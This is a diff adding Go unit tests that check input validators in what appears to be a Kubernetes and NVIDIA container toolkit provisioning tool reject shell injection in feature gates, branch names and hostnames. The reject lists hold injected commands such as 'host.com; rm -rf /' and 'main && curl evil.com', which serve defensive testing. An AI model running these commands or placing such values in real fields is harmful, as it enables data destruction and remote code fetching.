@@ -128,3 +128,120 @@ func TestValidateTemplateInputs_Injection(t *testing.T) {
 		t.Error("expected error for injection attempt, got nil")
 	}
 }
+
+func TestFeatureGatePattern(t *testing.T) {
+	accept := []string{"FeatureName=true", "MyGate=false", "A=true"}
+	reject := []string{
+		"bad;rm -rf /",
+		"NoValue",
+		"=true",
+		"Feature=maybe",
+		"Feature=true; echo pwned",
+		"$(curl evil)=true",
+	}
+
+	for _, v := range accept {
+		if !featureGatePattern.MatchString(v) {
+			t.Errorf("featureGatePattern should accept %q", v)
+		}
+	}
+	for _, v := range reject {
+		if featureGatePattern.MatchString(v) {
+			t.Errorf("featureGatePattern should reject %q", v)
+		}
+	}
+}
+
+func TestHostnamePattern(t *testing.T) {
+	accept := []string{"host.example.com", "192.168.1.1", "k8s-api:6443", "my-host"}
+	reject := []string{
+		"host.com; rm -rf /",
+		"$(curl evil)",
+		"host && bad",
+		"host`id`",
+		"; echo pwned",
+	}
+
+	for _, v := range accept {
+		if !hostnamePattern.MatchString(v) {
+			t.Errorf("hostnamePattern should accept %q", v)
+		}
+	}
+	for _, v := range reject {
+		if hostnamePattern.MatchString(v) {
+			t.Errorf("hostnamePattern should reject %q", v)
+		}
+	}
+}
+
+func TestValidateTemplateInputs_RejectsShellInFeatureGates(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.Kubernetes.K8sFeatureGates = []string{"Valid=true", "bad;rm -rf /"}
+	err := ValidateTemplateInputs(env)
+	if err == nil {
+		t.Error("expected error for shell injection in feature gate, got nil")
+	}
+}
+
+func TestValidateTemplateInputs_RejectsShellInTrackBranch(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.Kubernetes.Latest = &v1alpha1.K8sLatestSpec{
+		Repo:  "https://github.com/kubernetes/kubernetes",
+		Track: "main; curl evil.com",
+	}
+	err := ValidateTemplateInputs(env)
+	if err == nil {
+		t.Error("expected error for shell injection in track branch, got nil")
+	}
+}
+
+func TestValidateTemplateInputs_RejectsCTKTrackBranch(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.NVIDIAContainerToolkit.Latest = &v1alpha1.CTKLatestSpec{
+		Repo:  "https://github.com/NVIDIA/nvidia-container-toolkit",
+		Track: "main && curl evil.com",
+	}
+	err := ValidateTemplateInputs(env)
+	if err == nil {
+		t.Error("expected error for shell injection in CTK track branch, got nil")
+	}
+}
+
+func TestValidateTemplateInputs_RejectsShellInEndpointHost(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.Kubernetes.K8sEndpointHost = "host.com; rm -rf /"
+	err := ValidateTemplateInputs(env)
+	if err == nil {
+		t.Error("expected error for shell injection in endpoint host, got nil")
+	}
+}
+
+func TestValidateTemplateInputs_AcceptsValidFeatureGates(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.Kubernetes.K8sFeatureGates = []string{"GracefulNodeShutdown=true", "TopologyManager=false"}
+	err := ValidateTemplateInputs(env)
+	if err != nil {
+		t.Errorf("expected no error for valid feature gates, got: %v", err)
+	}
+}
+
+func TestValidateTemplateInputs_AcceptsValidTrackBranch(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.Kubernetes.Latest = &v1alpha1.K8sLatestSpec{
+		Repo:  "https://github.com/kubernetes/kubernetes",
+		Track: "master",
+	}
+	err := ValidateTemplateInputs(env)
+	if err != nil {
+		t.Errorf("expected no error for valid track branch, got: %v", err)
+	}
+}
+
+func TestValidateTemplateInputs_AcceptsValidEndpointHost(t *testing.T) {
+	env := v1alpha1.Environment{}
+	env.Spec.Kubernetes.K8sEndpointHost = "k8s-api.example.com"
+	err := ValidateTemplateInputs(env)
+	if err != nil {
+		t.Errorf("expected no error for valid endpoint host, got: %v", err)
+	}
+}
